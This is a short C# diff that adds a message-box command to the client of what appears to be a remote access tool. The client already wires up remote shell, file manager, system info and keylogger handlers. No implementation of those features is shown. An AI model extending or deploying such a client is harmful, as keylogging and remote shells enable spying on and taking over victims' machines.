@@ -22,6 +22,7 @@ namespace Client
         private SystemInfoHandler? _systemInfoHandler;
         private RemoteShellHandler? _remoteShellHandler;
         private FileManagerHandler? _fileManagerHandler;
+        private MessageBoxHandler? _messageBoxHandler;
         private KeyLoggerHandler? _keyLoggerHandler;
 
         public MainClientForm()
@@ -36,15 +37,18 @@ namespace Client
             var sysService = new SystemInfoService();
             var remoteShellService = new RemoteShellService();
             var fileManagerService = new FileManagerService();
+            var messageBoxService = new MessageBoxService();
             var keyLoggerService = new KeyLoggerService(_connection);
             _systemInfoHandler = new SystemInfoHandler(sysService, _connection);
             _remoteShellHandler = new RemoteShellHandler(remoteShellService, _connection);
             _fileManagerHandler = new FileManagerHandler(fileManagerService, _connection);
+            _messageBoxHandler = new MessageBoxHandler(messageBoxService, _connection);
             _keyLoggerHandler = new KeyLoggerHandler(keyLoggerService);
             _packetHandler = new PacketHandler(
                onSystemInfoRequest: req => _ = _systemInfoHandler!.HandleAsync(req),
                onRemoteShellRequest: sreq => _ = _remoteShellHandler!.HandleAsync(sreq),
                onFileManagerRequest: freq => _ = _fileManagerHandler!.HandleAsync(freq),
+               onMessageBoxRequest: mreq => _ = _messageBoxHandler!.HandleAsync(mreq),
                onKeyLoggerStart: kls => _ = _keyLoggerHandler!.HandleStartAsync(kls),
                onKeyLoggerStop: klt => _ = _keyLoggerHandler!.HandleStopAsync(klt),
                onKeyLoggerLangToggle: l => _ = _keyLoggerHandler!.HandleLangToggleAsync(l)
